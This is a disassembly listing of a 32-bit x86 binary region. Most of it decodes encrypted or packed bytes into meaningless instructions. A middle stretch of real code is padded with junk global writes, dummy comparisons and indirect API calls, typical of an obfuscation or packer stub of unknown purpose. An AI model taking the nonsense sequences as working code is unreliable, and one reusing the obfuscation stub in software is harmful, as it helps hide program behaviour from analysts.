  404b5f:	out    dx,al
  404b60:	sbb    BYTE PTR [ebp-0x44],ah
  404b63:	pusha  
  404b64:	rcr    DWORD PTR [eax],0x18
  404b67:	sahf   
  404b68:	adc    bl,BYTE PTR [eax]
  404b6a:	sbb    BYTE PTR [eax],ch
  404b6c:	fdivr  QWORD PTR ds:0xd5432df
  404b72:	add    eax,0x5dd2d878
  404b77:	pop    edx
  404b78:	retf   
  404b79:	and    DWORD PTR [esi+0x5c8fcc87],edi
  404b7f:	xchg   edi,eax
  404b80:	mov    esi,0x25aec185
  404b85:	adc    DWORD PTR [ebx+0x1b],ebx
  404b88:	xchg   ecx,eax
  404b89:	leave  
  404b8a:	add    DWORD PTR [edi-0x3e],ecx
  404b8d:	scas   al,BYTE PTR es:[edi]
  404b8e:	aad    0xd6
  404b90:	xchg   esp,eax
  404b91:	sbb    eax,0xd4a0f955
  404b96:	(bad)  
  404b97:	xchg   ebp,eax
  404b98:	xor    al,0x51
  404b9a:	jbe    0x404bcf
  404b9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b9d:	push   ebp
  404b9e:	rol    BYTE PTR [edx+eiz*8+0x36],1
  404ba2:	loope  0x404bcd
  404ba4:	das    
  404ba5:	fld    DWORD PTR [ebx+0x8]
  404ba8:	popf   
  404ba9:	or     esp,DWORD PTR [esi+0x570757d2]
  404baf:	jo     0x404b69
  404bb1:	clc    
  404bb2:	fbld   TBYTE PTR [edx-0x696e0aeb]
  404bb8:	mov    esi,0x9bd525d
  404bbd:	pop    esi
  404bbe:	and    eax,ecx
  404bc0:	xchg   edx,eax
  404bc1:	daa    
  404bc2:	leave  
  404bc3:	sub    bh,BYTE PTR [ebp-0x671b6cf5]
  404bc9:	mov    ds:0x17ed9328,eax
  404bce:	sbb    al,0x4b
  404bd0:	retf   
  404bd1:	xchg   edi,eax
  404bd2:	ss adc al,0xf4
  404bd5:	jns    0x404b5d
  404bd7:	das    
  404bd8:	mov    ah,0x9f
  404bda:	lock dec ecx
  404bdc:	cmc    
  404bdd:	and    edi,edx
  404bdf:	scas   eax,DWORD PTR es:[edi]
  404be0:	mov    esi,0x2e0cd66c
  404be5:	stos   DWORD PTR es:[edi],eax
  404be6:	add    eax,0xc44548f7
  404beb:	into   
  404bec:	popf   
  404bed:	adc    ch,BYTE PTR [ecx+esi*2-0x28]
  404bf1:	(bad)  [ecx+ecx*8-0x30]
  404bf5:	dec    edi
  404bf6:	(bad)  
  404bf8:	(bad)  
  404bf9:	push   edi
  404bfa:	and    BYTE PTR [esp+eiz*8+0x70],bl
  404bfe:	xor    al,0x56
  404c00:	outs   dx,DWORD PTR ds:[esi]
  404c01:	leave  
  404c02:	push   ebx
  404c03:	jns    0x404c14
  404c05:	dec    ebp
  404c06:	loop   0x404c56
  404c08:	stos   DWORD PTR es:[edi],eax
  404c09:	fs push edi
  404c0b:	dec    ecx
  404c0c:	inc    eax
  404c0d:	sbb    al,BYTE PTR [edi+0x65]
  404c10:	repz mov edx,0x3e860daf
  404c16:	mov    DWORD PTR [edx],esi
  404c18:	loope  0x404c99
  404c1a:	shr    DWORD PTR [ecx+0xb],cl
  404c1d:	dec    esi
  404c1e:	or     DWORD PTR ds:0xd5f86277,0x703f7a33
  404c28:	mov    ah,0xde
  404c2a:	(bad)  
  404c2b:	call   0x15359ce0
  404c30:	or     DWORD PTR [ebx],0x1031341c
  404c36:	retf   
  404c37:	les    ebx,FWORD PTR [edx-0x23]
  404c3a:	sti    
  404c3b:	add    eax,0xc1a0e779
  404c40:	mov    dh,0x82
  404c42:	shl    BYTE PTR [ebp-0xa],0xb6
  404c46:	lahf   
  404c47:	sub    BYTE PTR [ebx+0x7c],ch
  404c4a:	dec    eax
  404c4b:	into   
  404c4c:	mov    dl,0x29
  404c4e:	out    dx,eax
  404c4f:	out    dx,al
  404c50:	dec    ebp
  404c51:	cmp    edx,DWORD PTR [edx+edi*2-0x279b6ce0]
  404c58:	pusha  
  404c59:	test   eax,0x7fcb4d44
  404c5e:	add    BYTE PTR [esi+edx*2-0x74dd3f2b],cl
  404c65:	pop    ecx
  404c66:	cmp    eax,0xe64911eb
  404c6b:	fsubr  DWORD PTR [edi]
  404c6d:	jo     0x404c3a
  404c6f:	imul   bx,ax,0x7585
  404c74:	imul   BYTE PTR [ecx+edi*1+0xe]
  404c78:	stos   BYTE PTR es:[edi],al
  404c79:	jb     0x404cc9
  404c7b:	jbe    0x404c18
  404c7d:	out    dx,eax
  404c7e:	call   0x4e79ff6c
  404c83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c84:	mov    BYTE PTR [ecx+0x1cc0d62b],ch
  404c8a:	and    bh,BYTE PTR [edi-0x47]
  404c8d:	sub    eax,0x4327efd7
  404c92:	sub    ch,BYTE PTR [ebx+0xcb5ec8f]
  404c98:	xchg   dh,dh
  404c9a:	arpl   WORD PTR [ebp+0x1afa5e1d],sp
  404ca0:	sub    edi,DWORD PTR [edi+0x7b]
  404ca3:	fisttp QWORD PTR ds:0x4f1ecb79
  404ca9:	xchg   edi,eax
  404caa:	and    ebp,DWORD PTR [edx]
  404cac:	cmp    al,0xb0
  404cae:	ins    DWORD PTR es:[edi],dx
  404caf:	cmp    ah,BYTE PTR [ecx-0x5e942d14]
  404cb5:	and    edx,eax
  404cb7:	loope  0x404d12
  404cb9:	mov    ebp,0xf9054318
  404cbe:	ret    0xb43f
  404cc1:	mov    bl,0x5b
  404cc3:	imul   edx,ebx,0x6c
  404cc6:	mov    dl,BYTE PTR [edi]
  404cc8:	stos   BYTE PTR es:[edi],al
  404cc9:	dec    ecx
  404cca:	ins    DWORD PTR es:[edi],dx
  404ccb:	test   BYTE PTR [ebx+0x35bd5400],0x80
  404cd2:	sahf   
  404cd3:	jmp    0xdbef:0x4ee4374
  404cda:	sbb    al,0x16
  404cdc:	sbb    al,0xbc
  404cde:	add    eax,0x2d08f800
  404ce3:	pop    esi
  404ce4:	add    eax,0xf68f867a
  404ce9:	loope  0x404d1c
  404ceb:	in     al,0x30
  404ced:	ficom  WORD PTR [ebx+0x40]
  404cf0:	test   esi,eax
  404cf2:	and    eax,0xe8719db2
  404cf7:	imul   esp,eax,0x39
  404cfa:	cmp    eax,edx
  404cfc:	(bad)  [eax+ebx*4-0x2e9df670]
  404d03:	mov    edi,0xd7e2041d
  404d08:	lock dec edx
  404d0a:	jnp    0x404ce9
  404d0c:	jb     0x404d5e
  404d0e:	xchg   esi,eax
  404d0f:	cs xchg esi,eax
  404d11:	xor    al,0x17
  404d13:	out    dx,al
  404d14:	out    0x35,al
  404d16:	and    DWORD PTR [esi],esi
  404d18:	shl    BYTE PTR gs:[ebx-0x16],cl
  404d1c:	mov    ds:0x13ca2f12,al
  404d21:	push   ss
  404d22:	push   eax
  404d23:	and    eax,0x2166be66
  404d28:	inc    ebp
  404d29:	retf   
  404d2a:	enter  0xed54,0xc1
  404d2e:	aad    0xb0
  404d30:	add    BYTE PTR [esi-0x18dde842],dh
  404d36:	sbb    ah,0xdd
  404d39:	retf   
  404d3a:	sub    eax,0x41
  404d3d:	cld    
  404d3e:	out    dx,al
  404d3f:	jg     0x404d05
  404d41:	push   es
  404d42:	imul   eax,DWORD PTR [ebp+ecx*4-0x4e],0x95087fae
  404d4a:	or     dl,ah
  404d4c:	sbb    BYTE PTR ds:0x1f172900,cl
  404d52:	jmp    0x862d:0xcf474192
  404d59:	add    ah,bh
  404d5b:	lds    ecx,FWORD PTR [ebp-0x43a08ddb]
  404d61:	mov    dl,0xf7
  404d63:	in     eax,0x21
  404d65:	or     al,0xd3
  404d67:	add    ebx,DWORD PTR [edx]
  404d69:	add    eax,0xe6a05b13
  404d6e:	out    dx,al
  404d6f:	mov    ch,0x94
  404d71:	dec    esp
  404d72:	sbb    al,0x35
  404d74:	and    esp,esp
  404d76:	fsubr  DWORD PTR [ebp+0x7113a674]
  404d7c:	nop
  404d7d:	and    bl,bl
  404d7f:	cli    
  404d80:	xor    cl,bh
  404d82:	jno    0x404d82
  404d84:	dec    esp
  404d85:	aad    0x69
  404d87:	and    DWORD PTR [ebx-0x269e74dc],ecx
  404d8d:	test   BYTE PTR [edx+0x4f1f4bad],ch
  404d93:	add    al,0x37
  404d95:	or     eax,0x5e85ab3d
  404d9a:	xor    eax,0x492f3e2
  404d9f:	pop    es
  404da0:	sbb    edx,DWORD PTR [edi-0x2a]
  404da3:	xchg   ecx,eax
  404da4:	xchg   ebp,eax
  404da5:	shl    BYTE PTR [edx-0x3dd6b6f1],1
  404dab:	gs sub eax,0xb48d04e4
  404db1:	add    eax,0x7c064e17
  404db6:	out    0xfc,eax
  404db8:	sbb    DWORD PTR [edi],edi
  404dba:	jbe    0x404d5c
  404dbc:	popf   
  404dbd:	cld    
  404dbe:	or     ax,0xc10
  404dc2:	pop    edi
  404dc3:	ins    DWORD PTR es:[edi],dx
  404dc4:	xchg   ebp,eax
  404dc5:	mov    al,ds:0x3cc6457e
  404dca:	pop    ebp
  404dcb:	test   al,0x49
  404dcd:	mov    edx,0x7d895b37
  404dd2:	push   es
  404dd3:	int    0xc4
  404dd5:	in     eax,0xc8
  404dd7:	shl    DWORD PTR [ebx+esi*1],cl
  404dda:	push   0xffffffd9
  404ddc:	call   0x2d7b135c
  404de1:	sbb    al,0xbc
  404de3:	(bad)  
  404de4:	mov    ah,0x2a
  404de6:	inc    ebx
  404de7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404de8:	popa   
  404de9:	mov    edx,0x29818955
  404dee:	lods   eax,DWORD PTR ds:[esi]
  404def:	mov    al,ds:0xcf9c1305
  404df4:	xor    eax,0x5af06cc4
  404df9:	call   0xe2ef5b1f
  404dfe:	push   0xfdd8c696
  404e03:	mov    dh,0x5
  404e05:	xchg   edx,eax
  404e06:	push   0x79
  404e08:	ds push cs
  404e0a:	xor    dl,bh
  404e0c:	pop    eax
  404e0d:	adc    DWORD PTR [ebx+edi*8-0x4c3a6f98],0xa015a5a6
  404e18:	xor    esp,DWORD PTR ds:0x38c519aa
  404e1f:	in     eax,dx
  404e20:	xchg   BYTE PTR [esi+0x769ccfb5],dh
  404e26:	xor    al,0x23
  404e28:	outs   dx,BYTE PTR ds:[esi]
  404e29:	cmp    eax,0xefd00ff0
  404e2e:	shl    DWORD PTR [esp+esi*4],1
  404e31:	xchg   ecx,eax
  404e32:	sub    BYTE PTR [eax+0x4a],0xd1
  404e36:	stos   DWORD PTR es:[edi],eax
  404e37:	cmp    BYTE PTR [edi+0x71eb1287],ah
  404e3d:	fist   DWORD PTR [ebx]
  404e3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e40:	pop    esi
  404e41:	dec    esi
  404e42:	aam    0x9c
  404e44:	(bad)  
  404e45:	dec    ecx
  404e46:	jmp    0x38d0c6f2
  404e4b:	jmp    0x404ea3
  404e4d:	mov    ebx,0x3ea78ecd
  404e52:	mov    DWORD PTR [esi],ebx
  404e54:	xor    eax,0xda3baf00
  404e59:	rcl    DWORD PTR [edx-0x44837c84],cl
  404e5f:	jg     0x404e69
  404e61:	mov    ds:0x568719a8,al
  404e66:	jge    0x404ecf
  404e68:	jnp    0x404e7b
  404e6a:	adc    esp,DWORD PTR [ebp+0x16]
  404e6d:	cmp    al,0xe3
  404e6f:	dec    ecx
  404e70:	jae    0x404e2b
  404e72:	sub    al,0x97
  404e74:	xchg   esp,eax
  404e75:	out    0x8d,eax
  404e77:	(bad)  
  404e78:	push   ss
  404e79:	mov    ebp,0xc0700d63
  404e7e:	inc    eax
  404e7f:	inc    esi
  404e80:	test   eax,0xdd5b8dbe
  404e85:	shr    ebp,1
  404e87:	mov    esp,DWORD PTR [esp+ebp*2-0x1db38c2]
  404e8e:	stos   BYTE PTR es:[edi],al
  404e8f:	push   eax
  404e90:	pop    es
  404e91:	and    BYTE PTR [edi-0x21],al
  404e94:	enter  0xb4e5,0xc2
  404e98:	adc    eax,0xfc96f74b
  404e9d:	add    eax,0x1609e371
  404ea2:	cmp    eax,0x7c82cb83
  404ea7:	jp     0x404f10
  404ea9:	loopne 0x404ea0
  404eab:	pop    edi
  404eac:	retf   0xb984
  404eaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404eb0:	fiadd  WORD PTR [edi-0x2e]
  404eb3:	mov    bl,0x94
  404eb5:	push   cs
  404eb6:	aam    0xb9
  404eb8:	pop    ds
  404eb9:	rcl    BYTE PTR [esi],0x64
  404ebc:	ret    0x95fa
  404ebf:	mov    esp,0xb1c68402
  404ec4:	dec    esi
  404ec5:	es xchg edi,eax
  404ec7:	mov    edx,0xde789b9f
  404ecc:	sbb    eax,0xf6ddf920
  404ed1:	call   0xd264:0x62f7593c
  404ed8:	jmp    0x7aee9c7a
  404edd:	shr    bl,cl
  404edf:	jmp    0x7415d70
  404ee4:	arpl   si,di
  404ee6:	push   ds
  404ee7:	fadd   QWORD PTR [ebx]
  404ee9:	call   0x56b:0xd1d417af
  404ef0:	rcl    BYTE PTR [esi-0x22],cl
  404ef3:	inc    edx
  404ef4:	push   ebp
  404ef5:	pusha  
  404ef6:	sbb    esp,DWORD PTR [ebx-0x587fd3f1]
  404efc:	imul   BYTE PTR [edi]
  404efe:	cmc    
  404eff:	push   edi
  404f00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f01:	add    eax,0x663903cf
  404f06:	ror    dl,0xa7
  404f09:	mov    edx,0xc606c9f6
  404f0e:	inc    ebx
  404f0f:	add    edi,edx
  404f11:	lock xor dl,BYTE PTR [eax]
  404f14:	push   cs
  404f15:	add    al,0x4e
  404f17:	repnz icebp 
  404f19:	add    ebx,DWORD PTR [edx+0x152d1803]
  404f1f:	mov    cl,0xfe
  404f21:	pop    ss
  404f22:	xchg   esi,eax
  404f23:	stc    
  404f24:	(bad)  
  404f25:	in     al,0xcc
  404f27:	pop    eax
  404f28:	aad    0x1b
  404f2a:	push   ebp
  404f2b:	and    BYTE PTR [ebx],cl
  404f2d:	push   ebp
  404f2e:	in     al,0x81
  404f30:	sbb    eax,0x42823b
  404f35:	push   esi
  404f36:	je     0x404f38
  404f38:	add    cl,al
  404f3a:	loope  0x404f5a
  404f3c:	lea    ecx,[edx+eax*1]
  404f3f:	adc    edx,DWORD PTR ds:0x428247
  404f45:	mov    eax,DWORD PTR [ebx]
  404f47:	or     DWORD PTR ds:0x42835b,edi
  404f4d:	mov    edx,DWORD PTR [ebx+0x4]
  404f50:	mov    DWORD PTR ds:0x428337,0x1480
  404f5a:	shrd   eax,edx,0x2
  404f5e:	adc    DWORD PTR ds:0x428343,0x1a3a
  404f68:	shr    edx,0x2
  404f6b:	cmp    DWORD PTR ds:0x428343,0x0
  404f72:	mov    DWORD PTR ds:0x4282d3,ebx
  404f78:	mov    DWORD PTR ds:0x42834b,0x56b3
  404f82:	mov    DWORD PTR ds:0x42822b,0x1c7d
  404f8c:	jmp    0x405004
  404f91:	mov    DWORD PTR ds:0x4281ff,ebx
  404f97:	mov    DWORD PTR ds:0x428237,0x5683
  404fa1:	cmp    DWORD PTR ds:0x428343,0x0
  404fa8:	jg     0x404fd2
  404fae:	push   0x428f
  404fb3:	push   DWORD PTR [ebp-0x14]
  404fb6:	call   DWORD PTR ds:0x428d4c
  404fbc:	and    edx,DWORD PTR ds:0x4282e3
  404fc2:	sub    DWORD PTR ds:0x42820f,ecx
  404fc8:	or     DWORD PTR ds:0x428203,0xf0b
  404fd2:	adc    DWORD PTR ds:0x42813f,0x4903
  404fdc:	mov    edx,DWORD PTR ds:0x428323
  404fe2:	mov    edx,DWORD PTR [edx]
  404fe4:	add    DWORD PTR ds:0x42812b,edx
  404fea:	xor    edx,edx
  404fec:	xor    edx,DWORD PTR ds:0x428123
  404ff2:	xor    DWORD PTR ds:0x428263,edx
  404ff8:	mov    edx,DWORD PTR ds:0x428237
  404ffe:	add    DWORD PTR ds:0x42835b,edx
  405004:	mov    DWORD PTR [ebp-0x1c],eax
  405007:	mov    eax,ds:0x428263
  40500c:	add    DWORD PTR ds:0x42823b,eax
  405012:	mov    eax,DWORD PTR [ebx]
  405014:	sub    edx,0x532
  40501a:	mov    edx,DWORD PTR [ebx+0x4]
  40501d:	xor    DWORD PTR [ebp-0x1c],edi
  405020:	mov    edx,eax
  405022:	xor    eax,eax
  405024:	add    DWORD PTR ds:0x428343,0x32cc
  40502e:	or     eax,DWORD PTR [ebp-0x1c]
  405031:	sub    DWORD PTR ds:0x42834f,0x1679
  40503b:	shl    edx,0x1e
  40503e:	and    DWORD PTR ds:0x428137,edi
  405044:	imul   eax,ecx
  405047:	mov    ecx,DWORD PTR [ebx]
  405049:	mov    edx,DWORD PTR [ebx+0x4]
  40504c:	shrd   ecx,edx,0x2
  405050:	sbb    DWORD PTR ds:0x42835f,0x5de1
  40505a:	mov    DWORD PTR [ebp-0x1c],ecx
  40505d:	sbb    DWORD PTR ds:0x42824f,0x3a7c
  405067:	mov    ecx,DWORD PTR [ebx]
  405069:	adc    DWORD PTR ds:0x428143,0x428227
  405073:	xor    DWORD PTR [ebp-0x1c],edi
  405076:	shr    edx,0x2
  405079:	adc    DWORD PTR ds:0x42833b,ecx
  40507f:	mov    edx,DWORD PTR [ebx+0x4]
  405082:	mov    edx,ecx
  405084:	xor    ecx,ecx
  405086:	mov    DWORD PTR ds:0x42834b,0x321a
  405090:	or     ecx,DWORD PTR [ebp-0x1c]
  405093:	adc    DWORD PTR ds:0x42823b,0x428347
  40509d:	shl    edx,0x1e
  4050a0:	or     DWORD PTR ds:0x428233,0x428253
  4050aa:	sub    ecx,eax
  4050ac:	mov    eax,DWORD PTR [ebp-0xc]
  4050af:	mov    DWORD PTR ds:0x428207,0x7aa6
  4050b9:	cmp    DWORD PTR [eax],ecx
  4050bb:	not    eax
  4050bd:	mov    eax,DWORD PTR [ebp-0xc]
  4050c0:	mov    DWORD PTR ds:0x42833b,0x460d
  4050ca:	jg     0x405287
  4050d0:	mov    ecx,DWORD PTR [ebp+0x18]
  4050d3:	xor    DWORD PTR ds:0x42834b,edx
  4050d9:	mov    edx,DWORD PTR [ebp+0x1c]
  4050dc:	sbb    DWORD PTR ds:0x428357,0x4281fb
  4050e6:	shrd   ecx,edx,0x2
  4050ea:	sbb    DWORD PTR ds:0x428223,0x42820f
  4050f4:	mov    DWORD PTR [ebp-0x1c],ecx
  4050f7:	mov    ecx,DWORD PTR [ebp+0x18]
  4050fa:	xor    DWORD PTR [ebp-0x1c],edi
  4050fd:	or     DWORD PTR ds:0x42825f,0x2ce0
  405107:	shl    ecx,0x1e
  40510a:	xor    ecx,ecx
  40510c:	and    DWORD PTR ds:0x42823f,0x42821b
  405116:	or     ecx,DWORD PTR [ebp-0x1c]
  405119:	shr    edx,0x2
  40511c:	or     DWORD PTR ds:0x428127,ebx
  405122:	mov    edx,DWORD PTR [ebp+0x1c]
  405125:	mov    DWORD PTR [ebp-0x2c],ecx
  405128:	cmp    DWORD PTR ds:0x42834b,0x0
  40512f:	mov    DWORD PTR ds:0x42815b,edx
  405135:	mov    DWORD PTR ds:0x42832b,ecx
  40513b:	not    edx
  40513d:	jmp    0x405212
  405142:	mov    DWORD PTR ds:0x42813b,0x795c
  40514c:	cmp    DWORD PTR ds:0x42834b,0x0
  405153:	ja     0x40517c
  405159:	push   0x427f6c
  40515e:	push   DWORD PTR [ebp-0x24]
  405161:	push   0x6923
  405166:	call   DWORD PTR ds:0x428d74
  40516c:	or     DWORD PTR ds:0x428233,0xa87
  405176:	add    ecx,DWORD PTR ds:0x428367
  40517c:	adc    ecx,DWORD PTR ds:0x42814b
  405182:	xor    DWORD PTR ds:0x42813b,0x1a4f
  40518c:	sbb    DWORD PTR ds:0x42824f,edx
  405192:	cmp    DWORD PTR ds:0x4282ab,0x0
  405199:	mov    DWORD PTR ds:0x4282d7,0x66a6
  4051a3:	mov    DWORD PTR ds:0x4282b7,ecx
  4051a9:	mov    ecx,0x67a4
  4051ae:	jmp    0x405212
  4051b3:	mov    edx,0x2152
  4051b8:	cmp    DWORD PTR ds:0x4282ab,0x0
  4051bf:	jge    0x4051e9
  4051c5:	push   DWORD PTR [ebp-0x28]
  4051c8:	push   DWORD PTR [ebp-0x28]
  4051cb:	call   DWORD PTR ds:0x428d78
  4051d1:	inc    DWORD PTR ds:0x428247
  4051d7:	mov    ecx,DWORD PTR ds:0x428187
  4051dd:	mov    edx,DWORD PTR ds:0x428387
  4051e3:	sub    ecx,edx
  4051e5:	imul   ecx,DWORD PTR [ecx+edx*1]
  4051e9:	xor    DWORD PTR ds:0x4282ab,0x4a74
  4051f3:	mov    edx,DWORD PTR ds:0x42817f
  4051f9:	mov    edx,DWORD PTR [edx]
  4051fb:	sub    DWORD PTR ds:0x428233,edx
  405201:	mov    edx,DWORD PTR ds:0x428197
  405207:	mov    ecx,DWORD PTR ds:0x428387
  40520d:	sub    ecx,edx
  40520f:	and    edx,DWORD PTR [edx+ecx*1]
  405212:	mov    ecx,DWORD PTR [ebx]
  405214:	sub    DWORD PTR ds:0x42833f,0x2089
  40521e:	mov    edx,DWORD PTR [ebx+0x4]
  405221:	shrd   ecx,edx,0x2
  405225:	shr    edx,0x2
  405228:	mov    DWORD PTR [ebp-0x1c],ecx
  40522b:	xor    edx,edx
  40522d:	xor    edx,DWORD PTR ds:0x42824f
  405233:	sub    DWORD PTR ds:0x428153,edx
  405239:	mov    ecx,DWORD PTR [ebx]
  40523b:	inc    edx
  40523c:	mov    edx,DWORD PTR [ebx+0x4]
  40523f:	add    DWORD PTR ds:0x42832b,0x35fe
  405249:	xor    DWORD PTR [ebp-0x1c],edi
  40524c:	xor    edx,edx
  40524e:	xor    DWORD PTR ds:0x428137,0x631d
  405258:	or     edx,DWORD PTR [ebp-0x1c]
  40525b:	xor    DWORD PTR ds:0x42823f,0x428143
  405265:	shl    ecx,0x1e
  405268:	and    DWORD PTR ds:0x42835b,0x428227
  405272:	imul   edx,DWORD PTR [ebp-0x2c]
  405276:	add    DWORD PTR ds:0x428353,0x4996
  405280:	sub    DWORD PTR [eax],edx
  405282:	jmp    0x4058d5
  405287:	add    DWORD PTR ds:0x42812b,0x42f2
  405291:	mov    ecx,DWORD PTR [esi]
  405293:	cmp    DWORD PTR ds:0x428263,0x0
  40529a:	mov    DWORD PTR ds:0x4281f3,0x7c0
  4052a4:	mov    edx,DWORD PTR ds:0x428233
  4052aa:	mov    DWORD PTR ds:0x4282bb,0x4c43
  4052b4:	jmp    0x405321
  4052b9:	mov    DWORD PTR ds:0x428363,0x6b40
  4052c3:	mov    DWORD PTR ds:0x42824b,0x2bfd
  4052cd:	cmp    DWORD PTR ds:0x428263,0x0
  4052d4:	jae    0x4052fc
  4052da:	push   0x428029
  4052df:	push   0x1ca9
  4052e4:	call   DWORD PTR ds:0x428d7c
  4052ea:	add    edx,DWORD PTR ds:0x42821b
  4052f0:	adc    edx,0x1702
  4052f6:	add    edx,DWORD PTR ds:0x428143
  4052fc:	and    DWORD PTR ds:0x42814f,0x3bee
  405306:	dec    edx
  405307:	xor    edx,edx
  405309:	or     edx,DWORD PTR ds:0x428227
  40530f:	add    DWORD PTR ds:0x428263,edx
  405315:	mov    edx,DWORD PTR ds:0x42824b
  40531b:	add    DWORD PTR ds:0x428133,edx
  405321:	mov    edx,DWORD PTR [esi+0x4]
  405324:	xor    DWORD PTR ds:0x4282b7,0x4281ef
  40532e:	shrd   ecx,edx,0x2
  405332:	mov    DWORD PTR [ebp-0x1c],ecx
  405335:	cmp    DWORD PTR ds:0x4282d3,0x0
  40533c:	mov    DWORD PTR ds:0x4282cf,edi
  405342:	mov    DWORD PTR ds:0x428237,ebx
  405348:	jmp    0x405426
  40534d:	mov    DWORD PTR ds:0x4282db,0x4d36
  405357:	mov    DWORD PTR ds:0x428357,0x1e95
  405361:	cmp    DWORD PTR ds:0x4282d3,0x0
  405368:	jb     0x405396
  40536e:	push   0x848f
  405373:	push   0x5d21
  405378:	call   DWORD PTR ds:0x428d80
  40537e:	not    ecx
  405380:	adc    DWORD PTR ds:0x42835f,ecx
  405386:	neg    ecx
  405388:	mov    ecx,DWORD PTR ds:0x42839f
  40538e:	mov    ecx,DWORD PTR [ecx]
  405390:	sub    DWORD PTR ds:0x42833f,ecx
  405396:	mov    ecx,DWORD PTR ds:0x42820f
  40539c:	xor    DWORD PTR ds:0x42811b,ecx
  4053a2:	or     ecx,0x48b0
  4053a8:	sbb    DWORD PTR ds:0x42823b,edx
  4053ae:	cmp    DWORD PTR ds:0x4282bb,0x0
  4053b5:	mov    DWORD PTR ds:0x428127,edi
  4053bb:	not    DWORD PTR ds:0x4281fb
  4053c1:	jmp    0x405426
  4053c6:	mov    DWORD PTR ds:0x428157,0xab0
  4053d0:	cmp    DWORD PTR ds:0x4282bb,0x0
  4053d7:	jb     0x405406
  4053dd:	push   0x56df
  4053e2:	push   DWORD PTR [ebp-0x20]
  4053e5:	push   DWORD PTR [ebp-0x20]
  4053e8:	push   0x14ed
  4053ed:	push   DWORD PTR [ebp-0x24]
  4053f0:	call   DWORD PTR ds:0x428d84
  4053f6:	sub    ecx,DWORD PTR ds:0x42815b
  4053fc:	sub    DWORD PTR ds:0x4281fb,0x6432
  405406:	or     DWORD PTR ds:0x42821f,0x3285
  405410:	adc    ecx,DWORD PTR ds:0x42814f
  405416:	sub    DWORD PTR ds:0x428353,edi
  40541c:	mov    DWORD PTR ds:0x4281fb,0x48f2
  405426:	mov    ecx,DWORD PTR [esi]
  405428:	xor    DWORD PTR [ebp-0x1c],edi
  40542b:	shl    ecx,0x1e
  40542e:	adc    DWORD PTR ds:0x428237,0xf0c
  405438:	xor    ecx,ecx
  40543a:	xor    DWORD PTR ds:0x4282af,0x1337
  405444:	or     ecx,DWORD PTR [ebp-0x1c]
  405447:	shr    edx,0x2
  40544a:	mov    edx,DWORD PTR ds:0x42835f
  405450:	sub    edx,DWORD PTR ds:0x428113
  405456:	mov    DWORD PTR ds:0x42835f,edx
  40545c:	jmp    0x40583a
  405461:	xchg   ecx,eax
  405462:	stc    
  405463:	xchg   ebp,eax
  405464:	out    dx,al
  405465:	ins    BYTE PTR es:[edi],dx
  405466:	push   0x6b
  405468:	jbe    0x405493
  40546a:	push   0x25
  40546c:	stos   BYTE PTR es:[edi],al
  40546d:	pop    ebp
  40546e:	sbb    DWORD PTR [ebx+0x18b9e67c],esi
  405474:	sbb    BYTE PTR [esi+0x6e181812],bl
  40547a:	fimul  DWORD PTR [eax+0x53389be0]
  405480:	inc    esi
  405481:	enter  0xff4e,0x24
  405485:	dec    eax
  405486:	lahf   
  405487:	sahf   
  405488:	retf   
  405489:	cmc    
  40548a:	xlat   BYTE PTR ds:[ebx]
  40548b:	test   dl,0xc4
  40548e:	jo     0x4054de
  405490:	ror    DWORD PTR [eax-0xb1b416a],cl
  405496:	aad    0x8
  405498:	push   ebx
  405499:	xchg   ebx,eax
  40549a:	xchg   eax,eax
  40549c:	xchg   ebx,eax
  40549d:	sbb    esp,DWORD PTR [ecx-0x15]
  4054a0:	dec    ebp
  4054a1:	push   edx
  4054a2:	xchg   ebp,eax
  4054a3:	out    dx,al
  4054a4:	mov    esi,0x75eff4f8
  4054a9:	xor    ch,BYTE PTR [ebx]
  4054ab:	pop    ds
  4054ac:	xchg   ebx,eax
  4054ad:	aam    0xd8
  4054af:	and    al,0x71
  4054b1:	hlt    
  4054b2:	js     0x405450
  4054b4:	dec    esp
  4054b5:	adc    ch,ch
  4054b7:	test   al,0xa5
  4054b9:	jle    0x405447
  4054bb:	aam    0xea
  4054bd:	fcmovne st,st(3)
  4054bf:	sub    bh,BYTE PTR [ebx-0x39]
  4054c2:	mov    edi,0xa59f4a6
  4054c7:	mov    eax,ds:0xb7eb0500
  4054cc:	pusha  
  4054cd:	(bad)  
  4054ce:	daa    
  4054cf:	xor    al,0x9b
  4054d1:	ds mov ecx,0x865bd6c6
  4054d7:	jno    0x405519
  4054d9:	jae    0x405467
  4054db:	fs adc eax,0xb4d750c
  4054e1:	jl     0x40549f
  4054e3:	mov    eax,ds:0xe141066c
  4054e8:	shr    DWORD PTR [edi],0xe3
  4054eb:	loop   0x40548d
  4054ed:	outs   dx,DWORD PTR ds:[esi]
  4054ee:	mov    ds:0x96055b32,al
  4054f3:	sti    
  4054f4:	mov    ah,0xbb
  4054f6:	mov    cs,esi
  4054f8:	pop    esi
  4054f9:	add    BYTE PTR [eax],dh
  4054fb:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054fd:	or     eax,ecx
  4054ff:	(bad)  
  405501:	aas    
  405502:	int    0x5
  405504:	inc    eax
  405505:	cmp    al,0xb4
  405507:	xchg   esp,eax
  405508:	rcr    DWORD PTR [ebx-0x5c],0xc0
  40550c:	stos   DWORD PTR es:[edi],eax
  40550d:	push   esp
  40550e:	adc    al,dl
  405510:	and    dl,BYTE PTR [esi+eiz*1-0xb]
  405514:	test   eax,0xc9503932
  405519:	out    dx,al
  40551a:	stos   DWORD PTR es:[edi],eax
  40551b:	mov    ebp,DWORD PTR [ebp+0x61]
  40551e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40551f:	xlat   BYTE PTR ds:[ebx]
  405520:	test   DWORD PTR [edx-0x6b],0xdedfb000
  405527:	push   eax
  405528:	fidiv  WORD PTR [eax+edx*4+0xe]
  40552c:	jb     0x4055a9
  40552e:	test   BYTE PTR [eax],0x78
  405531:	jle    0x40555b
  405533:	mov    edx,0xf996e4aa
  405538:	inc    eax
  405539:	xor    eax,0x5e2aa41e
  40553e:	out    0xd8,eax
  405540:	or     BYTE PTR [esi+ecx*2+0x58f005fd],ch
  405547:	xor    DWORD PTR [esi-0x795a6218],edi
  40554d:	fcmovnbe st,st(3)
  40554f:	fisub  WORD PTR ds:[edi]
